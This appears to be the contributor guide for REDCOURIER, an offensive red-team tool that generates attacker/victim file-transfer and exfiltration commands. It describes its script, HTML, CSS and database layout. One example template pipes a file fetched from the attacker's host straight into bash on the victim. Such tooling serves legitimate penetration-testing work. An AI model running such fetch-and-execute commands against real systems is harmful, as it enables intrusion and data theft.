# Contributing to REDCOURIER
Thank you for your interest in expanding the REDCOURIER framework. This project thrives on community contributions, new bypasses, UI optimization, and cross-platform transfer methodologies. To maintain structural integrity, prevent layout breakage, and support the dynamic UI compiler engine, all additions to the code, design, or data layers must adhere to the architecture defined below.

## Contributing to the script logic
The core execution engine is located inside js/script10.js. It handles state management, processes dropdown filters, and updates the viewports dynamically. When modifying this file, keep the following principles in mind:

- State persistence: The application uses global state flags like currentDirection to track whether the user is in ingest or exfil mode. Do not introduce side effects that overwrite these variables outside the intentional tab-switching functions.
- Strict camelCase naming: All core utility functions and helper procedures must follow strict camelCase formatting (e.g., renderDynamicHostPanel, populateMainTechDropdown).
- The step generation loop: The dynamic rendering engine relies on the foreach loop that targets step arrays inside transferDatabase. If you modify how strings are escaped or wrapped (such as the pre-wrapper or safeCmd definitions), test the layout against complex multi-line templates like bash heredocs (<<EOF) to ensure characters are not eaten by the innerHTML injector.
- Keep logs clean: Production logic should minimize diagnostic spam. The custom debugApp function should remain the dedicated vehicle for dumping plaintext telemetry into the F12 developer console.

## Contributing to the index html interface
The layout framework resides within index.html. Because the JavaScript engine relies heavily on document object model (DOM) element selectors, structural changes require caution:
- Preserving id attributes: The script connects directly to specific input IDs (such as sourceOS, targetOS, mainTech, subMethod, attackerSSHUser, and victimSSHUser). Altering or removing these IDs will instantly break string interpolation and freeze the command generator output section.
- Trigger hooks: Input fields use explicit lifecycle event hooks like oninput=updateCommands() or onchange=onMainTechChange(). If you add new configuration bars or fields, ensure they hook back into the main pipeline updater so that the viewport renders changes in real time.
- Conditional group styling: Elements like attackerSSHUserGroup and victimSSHUserGroup are toggled between display: none and display: block programmatically by the script. Avoid applying conflicting overriding visibility utilities or layout rules to these specific wrapper divs.

## Contributing to the css styling
The presentation layer is governed by css/style.css. To maintain the centralized styling aesthetic, follow these interface standards:
- Theme architecture: The design targets a cohesive theme inspired by modern developer terminal color palettes. Use the existing hex variables for background tones, text layers, green success parameters, and red alert frameworks to keep the visuals uniform.
- Component positioning: Containers like the pre-wrapper use relative position attributes so that the copy-btn asset can layer directly inside or over the command block using absolute positioning rules. Moving or refactoring these structural elements without inspecting their bounding boxes will cause the copy buttons to detach and drift into viewport corners.
- Layout boundaries: The responsive wizard-grid splits inputs across clean, side-by-side flexbox or grid columns. Ensure any new element styling scales gracefully on compressed viewport widths without pushing critical configuration panels off the viewport bounds.

## Contributing to the database
The backend repository resides entirely within js/database.js. It is divided into exactly two distinct structural arrays. Do not create new arrays or use auxiliary injection functions.

1. The hostingDatabase: This handles the attacker-side daemons, listeners, and file servers.
2. The transferDatabase: This contains the sequential execution steps for both asset ingestion and data exfiltration across different operating systems.

## How to add a new attacker hosting daemon
If you want to add a new file server or connection listener to the attacker panel, navigate to the hostingDatabase array.

Each hosting object requires five specific key-value pairs:
- tech: The high-level classification string that hooks into the main protocol dropdown.
- id: A unique, lowercase snake_case identifier used by the selection engine.
- name: The descriptive text displayed inside the interface selection dropdown.
- defaultPort: The standard network port associated with the tool, defined as a string.
- template: The actual raw command string.

Example of a proper hosting daemon insertion:
```
{ tech: "CUSTOM", id: "custom_http_server", name: "Custom Web Server v2", defaultPort: "8080", template: "custom-server --port <PORT> --dir ." }
```
## How to add a new transfer method
If you are adding a new download wrapper (ingest) or upload bypass (exfil), locate the transferDatabase array.

Each transfer object requires six base attributes, alongside a nested steps array:
- tech: Matches the high-level classification string of the protocol.
- id: A unique identifier. For client-to-server models where the victim connects back to the attacker, always append the suffix _client_mode to the id. For server-to-client models where the attacker initiates connection to a victim-hosted daemon, append _server_mode.
- name: The friendly label shown in the sub-method tool selection dropdown.
- os: The operating system of the victim machine where the execution occurs (windows, linux, or any).
- direction: The transfer pipeline focus (ingest or exfil).
- steps: An array containing the precise sequential execution phase blocks.

Inside the steps array, each step block must contain:
- role: Identifies where the operator runs the command (attacker, target, or info).
- title: A concise phrase explaining the current operational phase.
- desc: A brief technical breakdown detailing what the step accomplishes.
- type: Set to code if it renders a terminal block, or info if it displays a situational instruction notice.
- template: The raw command skeleton utilizing standard engine placeholders.

Example of a proper transfer method insertion:
```
{
    tech: "WEB", id: "web_custom_curl_client_mode", name: "Curl - Modern In-Memory Ingestion", os: "linux", direction: "ingest",
    steps: [
        { role: "attacker", title: "Host the file", desc: "Fire up the selected attacker web engine.", type: "code", template: "<HOST_CMD>" },
        { role: "target", title: "Stream into memory", desc: "Execute custom binary data retrieval straight into execution.", type: "code", template: "curl -s http://<SRC_IP><PORT_URL>/<FILE> | bash" }
    ]
},
```

## Working with standard compiler placeholders
To ensure that the UI engine can dynamically parse and overwrite strings based on live user input, you must use the following case-sensitive tags inside your templates:

- <HOST_CMD>: Automatically injects the calculated template string from the selected attacker hosting engine.
- <SRC_IP>: Dynamically replaced with the provided attacker infrastructure IP address.
- <TGT_IP>: Dynamically replaced with the provided victim target IP address.
- <FILE>: Replaced with the user-defined filename of the asset being transferred.
- <PORT>: Automatically injects the runtime port number defined in the active pane.
- <PORT_URL>: Appends a clean colon-port string (e.g., :8000) only when non-standard HTTP ports are selected, stripping defaults dynamically.
- <SSH_USER>: Resolves the contextual SSH username field based on active role distribution and operating system environments.

## Why we enforce this specific structure
Maintaining this strict data layout is crucial for three major reasons:
1. Dynamic UI responsiveness: The user interface compiler relies entirely on key matching. If you mismatch a tech tag or an id convention, the dropdown menus will desynchronize, causing templates to render blank fields or collapse entirely.
2. Character safety: The frontend sanitizes and escapes tags like less-than and greater-than symbols dynamically during step loops. Keeping code inside static string templates prevents complex characters (such as multi-line bash heredocs or redirection symbols) from corrupting the active DOM layout.
3. Automated management compatibility: The database framework is actively scanned and maintained by an offline Python management tool. This manager relies on structured array bounds and predictable JSON-like object notation to parse statistics, run integrity checks, and append future records without human intervention.
